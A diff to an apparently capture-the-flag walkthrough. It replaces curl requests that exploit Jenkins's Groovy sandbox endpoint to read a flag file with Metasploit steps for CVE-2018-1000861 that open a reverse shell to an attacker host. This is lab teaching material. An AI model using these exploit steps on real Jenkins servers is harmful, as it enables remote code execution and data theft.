@@ -1,25 +1,24 @@
-The exploit, step by step:
+The full metasploit walk, every line:
 
-1. Confirm the bug still fires. Run:
+    msfconsole
 
-    curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(42)'
+    msf6 > search CVE-2018-1000861
+    msf6 > use 0
+    msf6 exploit(...) > set RHOSTS 10.4.12.1
+    msf6 exploit(...) > set LHOST 10.4.12.99
+    msf6 exploit(...) > check
+    msf6 exploit(...) > exploit
 
-   You should see "Result: 42". If you don't, the URL got mangled
-   on its way through. Try again with the WHOLE URL inside single
-   quotes (so your shell doesn't eat any characters).
+Once `exploit` fires, you'll see "Command shell session 1 opened"
+and the prompt goes blank. You're on the Jenkins box now. Run:
 
-2. Swap the println(42) for a file read. The Groovy expression is:
+    cat /var/m0use/blueprint.txt
 
-       new File("/var/m0use/blueprint.txt").text
+The flag is on the line that starts with "Flag:". Copy the value
+inside m0use{...} — that's what you'll submit.
 
-   URL-encoded for curl that becomes:
+To leave the shell session:    exit
+To leave msfconsole:            exit
 
-       new%20File(%22/var/m0use/blueprint.txt%22).text
-
-   So the curl command is:
-
-    curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=new%20File(%22/var/m0use/blueprint.txt%22).text'
-
-3. The server prints back the contents of the file. The flag is in
-   there — find the line that starts with "Flag:" and type the
-   value straight at the prompt (no keyword, no braces).
+Then type the flag value at the m0usenet prompt (no `m0use{` or
+`}` wrapping, no keyword). Example: jenkins_was_a_mistake
